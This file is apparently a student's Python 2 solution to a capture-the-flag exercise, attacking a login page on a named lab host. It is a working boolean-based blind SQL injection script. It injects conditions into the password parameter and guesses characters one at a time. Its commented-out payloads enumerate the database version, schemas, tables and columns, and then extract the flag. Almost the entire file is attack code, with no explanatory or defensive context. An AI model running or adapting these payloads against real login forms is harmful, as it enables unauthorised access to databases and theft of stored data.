import requests

url = "http://tor.atdog.tw:8080/boolean/login.php?u=admin&p=admin"
r = requests.get(url)
print r.content
url = "http://tor.atdog.tw:8080/boolean/login.php?u=admin&p=admin\' and 1=1 or \'"
url = "http://tor.atdog.tw:8080/boolean/login.php?u=admin&p=admin\' and 1=2 or \'"

baseStr = ""; 
testCharacter="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$^&*()-+={}[]<>/,.'\\\"_"
index = 0 
while index < len(testCharacter):
    # version = 5
    #data = "@@version like BINARY \"" + baseStr + testCharacter[index] + "%\""
    # db = sqli
    #data = " database() like BINARY \"" + baseStr + testCharacter[index] + "%\""
    # dbs = information
    #data = " EXISTS (SELECT * FROM information_schema.schemata WHERE schema_name like BINARY \"" + baseStr + testCharacter[index] + "%\")"
    # table schema = information_schema
    #data = " EXISTS (SELECT * FROM information_schema.columns WHERE table_schema like BINARY \"" + baseStr + testCharacter[index] + "%\")"
    # table schema = sqli_boolean
    #data = " EXISTS (SELECT * FROM information_schema.columns WHERE table_schema != 'information_schema' and table_schema like BINARY \"" + baseStr + testCharacter[index] + "%\")"
    # table name = iamflag
    #data = " EXISTS (SELECT * FROM information_schema.columns WHERE table_schema like 'sqli_boolean' AND table_name like BINARY \"" + baseStr + testCharacter[index] + "%\")"
    # colume name = flag
    #data = " EXISTS (SELECT * FROM information_schema.columns WHERE table_name like 'iamflag' AND column_name like BINARY \"" + baseStr + testCharacter[index] + "%\")"
    # SecProg{HelloMyFirstBooleanSQLINJECTION}
    baseStr = "SecProg{why_it_took"; 
    data = " EXISTS (SELECT * FROM iamflag WHERE flag like BINARY \"" + baseStr + testCharacter[index] + "%\")"
    url = "http://tor.atdog.tw:8080/boolean/login.php?u=admin&p=admin\' and " + data  + " or \'"
    #print data
    r = requests.get(url)
    #print r.content
    if ("Login Success" in str(r.content)):
        baseStr += testCharacter[index];
        print("Guess Password: " + baseStr)
        index = 0
        continue
    index += 1


